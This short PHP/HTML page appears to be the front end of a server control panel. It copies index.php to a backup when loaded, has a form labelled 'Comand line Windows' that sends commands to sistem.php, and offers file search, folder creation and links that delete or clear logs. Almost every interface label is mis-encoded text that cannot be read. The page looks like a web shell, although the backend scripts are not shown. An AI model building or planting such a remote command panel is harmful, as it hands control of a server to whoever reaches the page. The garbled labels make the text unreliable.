<body bgcolor="#E1E1E1">
<?php
copy("index.php","index.bac");
?>
<table border="1" bordercolor="#B5B5B5" >
<tr><td><br>
<form action="avil.php"	method="post">
<input type="text" name="skoko[directoria]" value="ilx">&nbsp;&nbsp;������� ����� ����������<br><br>
<input type="text" name="skoko[skoko]" value="12">&nbsp;&nbsp;���������� ������<br><br>
<input width=12 type="text" name="skoko[ogran]" value="3" >&nbsp;&nbsp;����������� �� �����
<input type="Submit" value="������� �����">
</form>
</td></tr>
</table><br>
<table border="1" bordercolor="#B5B5B5" >
<tr><td><br>
<form action="sistem.php" method="post">
<input type="text" name="skoko" value="help">&nbsp;&nbsp;Comand line Windows&nbsp;&nbsp;
<input type="Submit" value="���������">
</form>
</tr></td>
</table><br>
<table border="1" bordercolor="#B5B5B5" >
<tr><td><br>
<form action="serh.php" method="post">
<input type="text" name="skoko[neme]" value=".php">&nbsp;&nbsp;��� �����&nbsp;&nbsp;<br><br>
<input type="text" name="skoko[dir]" value="ilx">&nbsp;&nbsp;��� ������&nbsp;&nbsp;
<input type="Submit" value="�����">
</form>
</tr></td>
</table>

<a href="Status.php"><br>������</a>
<a href="dellog.php"><br>������� log.txt</a>
<a href="erlog.php"><br>�������� ���</a>
<a href="creatdel.php"><br>������� �����</a>
<a href="log.txt"><br>���������� log.txt </a>
<a href="dire.php"><br>����� ����������� �����</a>
</body>